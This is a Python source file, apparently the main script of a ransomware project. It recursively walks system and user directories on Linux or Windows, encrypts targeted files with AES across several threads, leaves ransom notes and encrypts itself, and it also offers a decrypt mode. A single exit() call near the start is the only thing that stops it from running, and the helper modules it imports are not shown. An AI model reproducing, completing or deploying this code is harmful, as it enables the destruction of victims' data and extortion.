import sys
import os

from base64 import encodebytes
from getpass import getpass
from time import time

from src.functions import recursive_walk, create_chunks, leave_notes
from src.classes import AsyncEncrypt, AesExcalibur, Colors
from src.variables import ascii_art, target_extensions, note


# Get the system's OS
if sys.platform in ["linux"]:
    paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "\var", "/opt"  # , "/usr", "/root"

elif sys.platform in ["win32", "win64", "Windows", "windows"]:
    paths = "C:\\ ", "."  # Name of each path to recursively walk


def main():
    """
    Recursively encrypt or decrypt the filesystem
    Display beautiful artwork
    Ward away the skids with exit()
    """

    os.system("clear" if sys.platform == "linux" else "cls")
    exit("THIS WILL HARM YOUR COMPUTER")
    print(Colors.blue + ascii_art)

    # Get and encode encryption password
    password = getpass(Colors.bold + "Enter a password for the encryption key: ")
    encoded_pass = encodebytes(bytes(password, "utf-8"))

    # Create encryption object
    sanctuary = AesExcalibur(encoded_pass)

    user_input = input(Colors.green + "Encrypt or Decrypt? [e/d] ")
    if user_input in ["e", "E", "enc", "encrypt", "Encrypt"]:

        # Get array of files to infect
        file_array = recursive_walk(paths, target_extensions, 1)

        # Split the array depending on how large it is. If more than 100,000 elements exist, use max 10 threads
        if len(file_array) > 100000:
            chunks = 12
        else:
            chunks = 6

        threads = []
        for chunk in list(create_chunks(file_array, chunks)):  # Loop through each chunk in array
            t = AsyncEncrypt(sanctuary, chunk)  # Start a new thread for each chunk
            t.start()
            threads.append(t)

        # Wait until all threads have joined, then drop notes and encrypt self
        while threads:
            # [threads.remove(t) for t in threads if not t.is_alive()]
            for t in threads:
                if not t.is_alive():
                    threads.remove(t)

        leave_notes(note, paths)
        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))

    elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
        file_array = recursive_walk(paths, target_extensions, 2)
        for file in file_array:
            print(Colors.purple + "Decrypting {}".format(file))
            sanctuary.decrypt_file(file)

    else:
        exit("Invalid input")


if __name__ == '__main__':
    start = time()
    main()
    print(Colors.underline + "Total runtime: {}".format(time() - start))
